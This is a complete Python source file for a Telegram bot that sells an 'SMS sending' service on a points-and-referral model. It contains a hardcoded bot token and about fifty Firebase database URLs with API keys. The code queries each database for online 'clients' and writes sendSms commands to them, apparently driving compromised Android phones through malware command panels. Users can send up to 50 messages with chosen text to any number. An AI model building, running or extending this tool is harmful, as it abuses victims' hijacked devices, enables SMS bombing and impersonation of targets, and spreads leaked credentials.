import telebot
import requests
import json
import time
import os
import random
import string
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# ============================================================
#  CONFIG
# ============================================================
BOT_TOKEN = "8875207437:AAEOFpkmBV6mK7ZbEHKoJdy3J8EyOnH6Ux0"
ADMIN_ID = 8647066036
BOT_USERNAME = "Indian_custom_sms_bot"
FORCE_CHANNEL = "@modxpatel"

bot = telebot.TeleBot(BOT_TOKEN)

# ============================================================
#  JSON FILE HANDLING
# ============================================================
def load_json(filename):
    try:
        with open(filename, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)

# ============================================================
#  INITIALIZE JSON FILES
# ============================================================
def init_files():
    files = ['user.json', 'firebase.json', 'redeem.json', 'ban.json', 'unban.json']
    for file in files:
        if not os.path.exists(file):
            save_json(file, {})

init_files()

# ============================================================
#  FIREBASE CONFIG
# ============================================================
def load_firebase_config():
    data = load_json('firebase.json')
    if not data:
        data = {
            'projects': [
                {"url": "https://phone55-d7d89-default-rtdb.firebaseio.com", "key": "yy"},
                {"url": "https://paisa-8e4f4-default-rtdb.firebaseio.com", "key": "euhe"},
                {"url": "https://jeko-c11ef-default-rtdb.firebaseio.com", "key": "ey"},
                {"url": "https://jpicku-47790-default-rtdb.firebaseio.com", "key": "AIzaSyDwSdv-wRfw8D65QuK83zbrNzTL292LTns"},
                {"url": "https://singhaana-6f199-default-rtdb.firebaseio.com", "key": "AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg"},
                {"url": "https://axisjames-default-rtdb.firebaseio.com", "key": "Vv"},
                {"url": "https://runjun-master-panel-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://tinnm88-b7db5-default-rtdb.firebaseio.com", "key": "AIzaSyBDanswTNTm4-E7v4wCX-_WsQ0A8ZaDIf4"},
                {"url": "https://e9turnament1-default-rtdb.firebaseio.com", "key": "AIzaSyDJrFRMMpcX0rCZZb23t-Mps_U_giS1ZiM"},
                {"url": "https://raaz-5287d-default-rtdb.firebaseio.com", "key": "Hebdixndd"},
                {"url": "https://apkpure-6eb6a-default-rtdb.firebaseio.com", "key": "AIzaSyCA3ms8hASuy0fgaR5fpJI75dClkeCxomE"},
                {"url": "https://e14turnament2-default-rtdb.firebaseio.com", "key": "AIzaSyBIjWavyJ8SHeZ14iLesy4bAOr8EPGtB8"},
                {"url": "https://bossuun-default-rtdb.firebaseio.com", "key": "AIzaSyBfQobM5HmnK6khogyF4ytOX7E9N0e_lAQ"},
                {"url": "https://anup-f900e-default-rtdb.firebaseio.com", "key": "AIzaSyCAotgwHCK_dFwvDMPOoMzq5-Q3KsFfOGk"},
                {"url": "https://xxx-kumar-default-rtdb.firebaseio.com", "key": "ghutan"},
                {"url": "https://vdgsh-623ed-default-rtdb.firebaseio.com", "key": "hhh"},
                {"url": "https://chudgy-1cdca-default-rtdb.firebaseio.com", "key": "ggt"},
                {"url": "https://totla-panel-default-rtdb.firebaseio.com", "key": "ygf"},
                {"url": "https://e3turnament11-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://wait-5fead-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://chfjfj-c2857-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://shilpa-e712a-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://dharmesh-panel-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://kali-1b217-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://sanam-bewafa-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://admin-panel-pikachu-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://ramm-bac59-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://customer-1b7ca-default-rtdb.firebaseio.com", "key": "1234"},
                {"url": "https://suman-95a0a-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://hwllob-1a740-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://loddysingh-6d511-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://tabuna-4e962-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://hopital-new-12-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://uchit-79817-default-rtdb.firebaseio.com", "key": "AIzaSyBmvN_l9AsGQmlvNqsxTH6JADX8UBOuUAA"},
                {"url": "https://pm-modi-06hlhu-default-rtdb.firebaseio.com", "key": "AIzaSyBF6Lp68HT2s0PyHyg3pD_qmYAKEE0kN5w"},
                {"url": "https://courier40-30jan-default-rtdb.firebaseio.com", "key": "AIzaSyDnRaxCDNhr9GyfDolL7Pai9ABa-xCgeCk"},
                {"url": "https://aashish-2e04c-default-rtdb.firebaseio.com", "key": "V"},
                {"url": "https://dipanshu-bf4d2-default-rtdb.firebaseio.com", "key": "AIzaSyCZ7TZtCGzBgfHFJalE-T3NzaQvh4feSTA"},
                {"url": "https://rto-61z-apr-29-amit-default-rtdb.firebaseio.com", "key": "AIzaSyA1NjZ9455eUoAvQ254tOA6sH4YO297ML4"},
                {"url": "https://jai-ram-ji-default-rtdb.firebaseio.com", "key": "S"},
                {"url": "https://maxbhai-b8d3a-default-rtdb.firebaseio.com", "key": "Key"},
                {"url": "https://rohan12a-default-rtdb.firebaseio.com", "key": "La"},
                {"url": "https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app", "key": "Key"},
                {"url": "https://hamza-5a3c2-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://raj-developer-7efe9-default-rtdb.firebaseio.com", "key": "AIzaSyCPJZCKm810ABwYyqH8MXqvYkn4GidguYg"},
                {"url": "https://raj-admin-nokia-default-rtdb.firebaseio.com", "key": "T"},
                {"url": "https://lodaroll-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
                {"url": "https://sabji4-default-rtdb.firebaseio.com", "key": "AIzaSyDRn1wYg0s60mKY2Y4Yilko_b_O3tNf8rQ"},
            ]
        }
        save_json('firebase.json', data)
    return data

fb_config = load_firebase_config()

# ============================================================
#  USER DATA - SIGNUP = 100 POINTS
# ============================================================
def get_user_data(user_id):
    data = load_json('user.json')
    if str(user_id) not in data:
        data[str(user_id)] = {
            'points': 100,  # SIGNUP BONUS = 100
            'refer_code': None,
            'referred_by': None,
            'sms_count': 0,
            'join_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'banned': False
        }
        save_json('user.json', data)
    return data[str(user_id)]

def save_user_data(user_id, user_info):
    data = load_json('user.json')
    data[str(user_id)] = user_info
    save_json('user.json', data)

def get_user_points(user_id):
    user = get_user_data(user_id)
    return user.get('points', 0)

def add_points(user_id, points):
    user = get_user_data(user_id)
    user['points'] = user.get('points', 0) + points
    save_user_data(user_id, user)
    return user['points']

def deduct_points(user_id, points):
    user = get_user_data(user_id)
    if user.get('points', 0) >= points:
        user['points'] = user.get('points', 0) - points
        save_user_data(user_id, user)
        return True
    return False

# ============================================================
#  REDEEM SYSTEM
# ============================================================
def generate_redeem_code(amount):
    redeem_data = load_json('redeem.json')
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    redeem_data[code] = {
        'amount': amount,
        'used_by': None,
        'used_at': None,
        'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'active': True
    }
    save_json('redeem.json', redeem_data)
    return code

def use_redeem_code(user_id, code):
    redeem_data = load_json('redeem.json')
    if code not in redeem_data:
        return False, "❌ Invalid redeem code!"
    if not redeem_data[code]['active']:
        return False, "❌ Code already used!"
    
    amount = redeem_data[code]['amount']
    redeem_data[code]['used_by'] = str(user_id)
    redeem_data[code]['used_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    redeem_data[code]['active'] = False
    save_json('redeem.json', redeem_data)
    
    add_points(user_id, amount)
    return True, f"✅ Redeemed {amount} points!"

# ============================================================
#  FIREBASE FUNCTIONS
# ============================================================
def get_all_online_devices():
    config = load_json('firebase.json')
    all_devices = []
    
    for project in config.get('projects', []):
        try:
            url = f"{project['url']}/clients.json?auth={project['key']}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data:
                    for device_id, device in data.items():
                        status = device.get('status')
                        is_online = False
                        if isinstance(status, bool):
                            is_online = status
                        elif isinstance(status, str):
                            is_online = status.lower() in ['online', 'true']
                        elif isinstance(status, (int, float)):
                            is_online = bool(status)
                        if is_online:
                            all_devices.append({
                                'id': device_id,
                                'name': device.get('name') or device.get('deviceName') or device_id[:10],
                                'project_url': project['url'],
                                'project_key': project['key']
                            })
        except:
            continue
    
    return all_devices

def send_sms_via_device(device, phone, message):
    try:
        url = f"{device['project_url']}/clients/{device['id']}/webhookEvent.json?auth={device['project_key']}"
        data = {
            'sendSms': {
                'from': 1,
                'to': phone,
                'message': message,
                'timestamp': int(time.time() * 1000),
                'isSended': False
            }
        }
        response = requests.put(url, json=data, timeout=15)
        return response.status_code == 200
    except:
        return False

def send_multiple_sms(phone, message, count, user_id):
    devices = get_all_online_devices()
    
    if not devices:
        return False, "❌ No online devices found!", 0, 0
    
    success_count = 0
    failed_count = 0
    
    for i in range(count):
        device = devices[i % len(devices)]
        success = send_sms_via_device(device, phone, message)
        
        if success:
            success_count += 1
        else:
            failed_count += 1
        
        time.sleep(0.3)
    
    user = get_user_data(user_id)
    user['sms_count'] = user.get('sms_count', 0) + success_count
    save_user_data(user_id, user)
    
    return True, "", success_count, failed_count

# ============================================================
#  CHECK FORCE JOIN
# ============================================================
def check_force_join(user_id):
    try:
        member = bot.get_chat_member(FORCE_CHANNEL, user_id)
        return member.status not in ['left', 'kicked']
    except:
        return False

# ============================================================
#  KEYBOARDS - DAILY HATAYA
# ============================================================
def user_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("📨 𝚂𝙴𝙽𝙳 𝚂𝙼𝚂"),
        KeyboardButton("👥 𝚁𝙴𝙵𝙴𝙴𝚁")
    )
    markup.add(
        KeyboardButton("👤 𝙰𝙲𝙲𝙾𝚄𝙽𝚃"),
        KeyboardButton("🎁 𝚁𝙴𝙳𝙴𝙴𝙼")
    )
    markup.add(
        KeyboardButton("❓ 𝙷𝙴𝙻𝙿")
    )
    return markup

def admin_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("🚫 𝙱𝙰𝙽"),
        KeyboardButton("✅ 𝚄𝙽𝙱𝙰𝙽")
    )
    markup.add(
        KeyboardButton("📢 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃"),
        KeyboardButton("🎁 𝙶𝙴𝙽 𝚁𝙴𝙴𝙳𝙴𝙼")
    )
    markup.add(
        KeyboardButton("📁 𝙰𝙻𝙻 𝙵𝙸𝙻𝙴́"),
        KeyboardButton("📊 𝙾𝙽𝙻𝙸𝙽𝙴 𝙳𝙴𝚅𝙸𝙲𝙴𝚂")
    )
    markup.add(
        KeyboardButton("🚪 𝙴𝚇𝙸𝚃")
    )
    return markup

def is_admin(chat_id):
    return chat_id == ADMIN_ID

# ============================================================
#  START COMMAND
# ============================================================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name or "User"
    
    if not check_force_join(user_id):
        bot.send_message(
            user_id,
            f"🔒 *Join Required!*\n\n👋 Welcome {user_name}!\n\nPlease join our channel:\n📢 {FORCE_CHANNEL}\n\nAfter joining, send /start again.",
            parse_mode='Markdown'
        )
        return
    
    ban_data = load_json('ban.json')
    if str(user_id) in ban_data:
        bot.send_message(user_id, "🚫 You are banned!", parse_mode='Markdown')
        return
    
    if message.text and 'ref_' in message.text:
        try:
            ref_user_id = int(message.text.split('ref_')[1].strip())
            if ref_user_id != user_id:
                add_points(ref_user_id, 100)
                bot.send_message(ref_user_id, f"👥 New user joined using your referral!\n+100 points added!")
        except:
            pass
    
    user = get_user_data(user_id)
    points = user.get('points', 0)
    
    msg = f"""
👋 Welcome {user_name}!

🤖 MOD X PATEL SMS BOT
💰 Points: {points}

Select an option:
"""
    bot.send_message(
        user_id,
        msg,
        parse_mode='Markdown',
        reply_markup=user_keyboard()
    )

# ============================================================
#  ADMIN COMMAND
# ============================================================
@bot.message_handler(commands=['admin'])
def admin_command(message):
    user_id = message.chat.id
    
    if not is_admin(user_id):
        bot.send_message(user_id, "⛔ Unauthorized!")
        return
    
    bot.send_message(
        user_id,
        "🔐 *ADMIN PANEL*\n\nSelect an option:",
        parse_mode='Markdown',
        reply_markup=admin_keyboard()
    )

# ============================================================
#  USER - SEND SMS
# ============================================================
@bot.message_handler(func=lambda message: message.text == "📨 𝚂𝙴𝙽𝙳 𝚂𝙼𝚂" and not is_admin(message.chat.id))
def send_sms_button(message):
    user_id = message.chat.id
    
    ban_data = load_json('ban.json')
    if str(user_id) in ban_data:
        bot.send_message(user_id, "🚫 You are banned!")
        return
    
    points = get_user_points(user_id)
    if points < 1:
        bot.send_message(user_id, "❌ Insufficient points! Need 1 point.", reply_markup=user_keyboard())
        return
    
    bot.send_message(
        user_id,
        "📨 *SEND SMS*\n\n📞 Enter phone number (with +):\nExample: +919876543210\n\n_Type /cancel to cancel_",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_get_phone)

def user_get_phone(message):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        bot.send_message(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    phone = message.text.strip()
    
    if not phone.startswith('+') or not phone[1:].isdigit():
        bot.send_message(
            user_id,
            "❌ Invalid number!\nUse: +919876543210\n\nSend again or /cancel:"
        )
        bot.register_next_step_handler_by_chat_id(user_id, user_get_phone)
        return
    
    bot.send_message(
        user_id,
        f"📞 Phone: {phone}\n\n📝 Now send your message:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_get_message, phone)

def user_get_message(message, phone):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        bot.send_message(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    msg_text = message.text.strip()
    
    if not msg_text:
        bot.send_message(user_id, "❌ Message cannot be empty!", reply_markup=user_keyboard())
        return
    
    bot.send_message(
        user_id,
        f"📞 Phone: {phone}\n"
        f"💬 Message: {msg_text[:50]}...\n\n"
        f"🔢 How many SMS to send?\n"
        f"💰 Each SMS = 1 Point\n"
        f"🔄 Each SMS = Different Device\n\n"
        f"Send a number (1-50):",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_get_count, phone, msg_text)

def user_get_count(message, phone, msg_text):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        bot.send_message(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    try:
        count = int(message.text.strip())
        if count <= 0 or count > 50:
            raise ValueError
    except:
        bot.send_message(
            user_id,
            "❌ Invalid number!\nSend a valid number (1-50):"
        )
        bot.register_next_step_handler_by_chat_id(user_id, user_get_count, phone, msg_text)
        return
    
    points = get_user_points(user_id)
    total_cost = count
    
    if points < total_cost:
        bot.send_message(
            user_id,
            f"❌ Insufficient points!\nNeed: {total_cost}\nHave: {points}\n\nEarn more via REFER!",
            reply_markup=user_keyboard()
        )
        return
    
    bot.send_message(
        user_id,
        f"📞 Phone: {phone}\n"
        f"💬 {msg_text[:50]}...\n"
        f"📊 Count: {count}\n"
        f"💰 Cost: {total_cost} points\n"
        f"🔄 Each SMS = Different Device\n\n"
        f"Send *YES* to confirm or /cancel",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_send_final, phone, msg_text, count)

def user_send_final(message, phone, msg_text, count):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        bot.send_message(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    if message.text.upper() != 'YES':
        bot.send_message(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    total_cost = count
    if not deduct_points(user_id, total_cost):
        bot.send_message(user_id, "❌ Insufficient points!", reply_markup=user_keyboard())
        return
    
    bot.send_message(user_id, f"⏳ Sending {count} SMS...")
    
    success, error, success_count, failed_count = send_multiple_sms(phone, msg_text, count, user_id)
    
    if not success:
        add_points(user_id, total_cost)
        bot.send_message(user_id, f"❌ {error}\n\nPoints refunded!", reply_markup=user_keyboard())
        return
    
    bot.send_message(
        user_id,
        f"✅ *SMS Sent!*\n\n"
        f"📞 To: {phone}\n"
        f"📊 Sent: {success_count} ✅\n"
        f"📊 Failed: {failed_count} ❌\n"
        f"💰 Points Left: {get_user_points(user_id)}",
        parse_mode='Markdown',
        reply_markup=user_keyboard()
    )

# ============================================================
#  USER - REFEER
# ============================================================
@bot.message_handler(func=lambda message: message.text == "👥 𝚁𝙴𝙵𝙴𝙴𝚁" and not is_admin(message.chat.id))
def referee_button(message):
    user_id = message.chat.id
    
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
    
    msg = f"""
👥 *REFER & EARN*

Share your referral link:
`{link}`

👥 Each referral = 100 Points
💰 Signup Bonus = 100 Points
"""
    bot.send_message(user_id, msg, parse_mode='Markdown', reply_markup=user_keyboard())

# ============================================================
#  USER - ACCOUNT
# ============================================================
@bot.message_handler(func=lambda message: message.text == "👤 𝙰𝙲𝙲𝙾𝚄𝙽𝚃" and not is_admin(message.chat.id))
def account_button(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name or "User"
    
    user = get_user_data(user_id)
    points = user.get('points', 0)
    sms_count = user.get('sms_count', 0)
    join_date = user.get('join_date', 'N/A')
    
    msg = f"""
👤 *MY ACCOUNT*

👤 Name: {user_name}
💰 Points: {points}
📨 SMS Sent: {sms_count}
📅 Joined: {join_date}

👥 Each referral = 100 Points
"""
    bot.send_message(user_id, msg, parse_mode='Markdown', reply_markup=user_keyboard())

# ============================================================
#  USER - REDEEM
# ============================================================
@bot.message_handler(func=lambda message: message.text == "🎁 𝚁𝙴𝙳𝙴𝙴𝙼" and not is_admin(message.chat.id))
def redeem_button(message):
    user_id = message.chat.id
    
    bot.send_message(
        user_id,
        "🎁 *REDEEM CODE*\n\nEnter your redeem code:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_redeem_code)

def user_redeem_code(message):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        bot.send_message(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    code = message.text.strip().upper()
    success, result = use_redeem_code(user_id, code)
    
    bot.send_message(user_id, result, reply_markup=user_keyboard())

# ============================================================
#  USER - HELP
# ============================================================
@bot.message_handler(func=lambda message: message.text == "❓ 𝙷𝙴𝙻𝙿" and not is_admin(message.chat.id))
def help_button(message):
    user_id = message.chat.id
    
    msg = """
❓ *HELP GUIDE*

📌 *How to Send SMS*
1. Click SEND SMS
2. Enter phone number
3. Enter your message
4. Enter how many SMS to send
5. Confirm with YES

💰 *Points System*
• Signup Bonus: 100 Points
• Referral: 100 Points
• SMS Cost: 1 Point

👥 *Referral*
Share your refer code with friends!

📢 Contact: @SOCIALBANNERR
"""
    bot.send_message(user_id, msg, parse_mode='Markdown', reply_markup=user_keyboard())

# ============================================================
#  ADMIN HANDLER
# ============================================================
@bot.message_handler(func=lambda message: is_admin(message.chat.id))
def admin_handler(message):
    chat_id = message.chat.id
    text = message.text
    
    if text == "🚪 𝙴𝚇𝙸𝚃":
        user = get_user_data(chat_id)
        points = user.get('points', 0)
        msg = f"👋 Welcome Admin!\n💰 Points: {points}\n\nSelect an option:"
        bot.send_message(chat_id, msg, reply_markup=user_keyboard())
        return
    
    if text == "🚫 𝙱𝙰𝙽":
        admin_ban(chat_id)
    elif text == "✅ 𝚄𝙽𝙱𝙰𝙽":
        admin_unban(chat_id)
    elif text == "📢 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃":
        admin_broadcast(chat_id)
    elif text == "🎁 𝙶𝙴𝙽 𝚁𝙴𝙴𝙳𝙴𝙼":
        admin_gen_redeem(chat_id)
    elif text == "📁 𝙰𝙻𝙻 𝙵𝙸𝙻𝙴́":
        admin_all_files(chat_id)
    elif text == "📊 𝙾𝙽𝙻𝙸𝙽𝙴 𝙳𝙴𝚅𝙸𝙲𝙴𝚂":
        admin_online_devices(chat_id)
    else:
        bot.send_message(chat_id, "Select from admin menu:", reply_markup=admin_keyboard())

# ============================================================
#  ADMIN FUNCTIONS
# ============================================================
def admin_ban(chat_id):
    bot.send_message(chat_id, "🚫 *BAN USER*\n\nSend user ID:")
    bot.register_next_step_handler_by_chat_id(chat_id, admin_ban_user)

def admin_ban_user(message):
    chat_id = message.chat.id
    
    try:
        user_id = int(message.text.strip())
    except:
        bot.send_message(chat_id, "❌ Invalid ID!", reply_markup=admin_keyboard())
        return
    
    ban_data = load_json('ban.json')
    ban_data[str(user_id)] = {
        'banned_by': chat_id,
        'banned_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_json('ban.json', ban_data)
    
    unban_data = load_json('unban.json')
    if str(user_id) in unban_data:
        del unban_data[str(user_id)]
        save_json('unban.json', unban_data)
    
    bot.send_message(chat_id, f"✅ User {user_id} banned!", reply_markup=admin_keyboard())

def admin_unban(chat_id):
    bot.send_message(chat_id, "✅ *UNBAN USER*\n\nSend user ID:")
    bot.register_next_step_handler_by_chat_id(chat_id, admin_unban_user)

def admin_unban_user(message):
    chat_id = message.chat.id
    
    try:
        user_id = int(message.text.strip())
    except:
        bot.send_message(chat_id, "❌ Invalid ID!", reply_markup=admin_keyboard())
        return
    
    ban_data = load_json('ban.json')
    if str(user_id) in ban_data:
        del ban_data[str(user_id)]
        save_json('ban.json', ban_data)
    
    unban_data = load_json('unban.json')
    unban_data[str(user_id)] = {
        'unbanned_by': chat_id,
        'unbanned_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_json('unban.json', unban_data)
    
    bot.send_message(chat_id, f"✅ User {user_id} unbanned!", reply_markup=admin_keyboard())

def admin_broadcast(chat_id):
    bot.send_message(chat_id, "📢 *BROADCAST*\n\nSend your message:")
    bot.register_next_step_handler_by_chat_id(chat_id, admin_broadcast_send)

def admin_broadcast_send(message):
    chat_id = message.chat.id
    broadcast_text = message.text
    
    users = load_json('user.json')
    sent = 0
    
    for uid in users.keys():
        try:
            bot.send_message(int(uid), f"📢 ANNOUNCEMENT\n\n{broadcast_text}")
            sent += 1
            time.sleep(0.05)
        except:
            continue
    
    bot.send_message(chat_id, f"✅ Broadcast sent to {sent} users!", reply_markup=admin_keyboard())

def admin_gen_redeem(chat_id):
    bot.send_message(chat_id, "🎁 *GENERATE REDEEM CODE*\n\nEnter points amount:")
    bot.register_next_step_handler_by_chat_id(chat_id, admin_gen_redeem_amount)

def admin_gen_redeem_amount(message):
    chat_id = message.chat.id
    
    try:
        amount = int(message.text.strip())
        if amount <= 0:
            raise ValueError
    except:
        bot.send_message(chat_id, "❌ Invalid amount!", reply_markup=admin_keyboard())
        return
    
    code = generate_redeem_code(amount)
    
    msg = f"""
✅ *REDEEM CODE GENERATED*

🔑 Code: `{code}`
💰 Amount: {amount} points

Share this code with users!
"""
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=admin_keyboard())

def admin_all_files(chat_id):
    files = ['user.json', 'firebase.json', 'redeem.json', 'ban.json', 'unban.json']
    msg = "📁 *ALL FILES*\n\n"
    
    for file in files:
        data = load_json(file)
        msg += f"📄 {file}: {len(data)} entries\n"
    
    for file in files:
        try:
            bot.send_document(chat_id, open(file, 'rb'))
        except:
            pass
    
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=admin_keyboard())

def admin_online_devices(chat_id):
    devices = get_all_online_devices()
    
    msg = f"""
📊 *ONLINE DEVICES*

🟢 Total Online: {len(devices)}

All Firebase projects are active.
"""
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=admin_keyboard())

# ============================================================
#  FALLBACK
# ============================================================
@bot.message_handler(func=lambda message: True)
def fallback_handler(message):
    chat_id = message.chat.id
    
    if is_admin(chat_id):
        bot.send_message(chat_id, "Use admin menu:", reply_markup=admin_keyboard())
    else:
        bot.send_message(chat_id, "Use the buttons below:", reply_markup=user_keyboard())

# ============================================================
#  START BOT
# ============================================================
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║  🤖 MOD X PATEL SMS BOT              ║
    ║  💰 Points System Active             ║
    ║  👥 Referral: 100 Points             ║
    ║  🎁 Signup: 100 Points              ║
    ║  📨 SMS: -1 Point                   ║
    ╚═══════════════════════════════════════╝
    """)
    print(f"🔑 Admin ID: {ADMIN_ID}")
    print(f"📢 Force Channel: {FORCE_CHANNEL}")
    print(f"📡 Firebase Projects: {len(load_firebase_config().get('projects', []))}")
    print("📱 Bot is running...")
    
    bot.infinity_polling()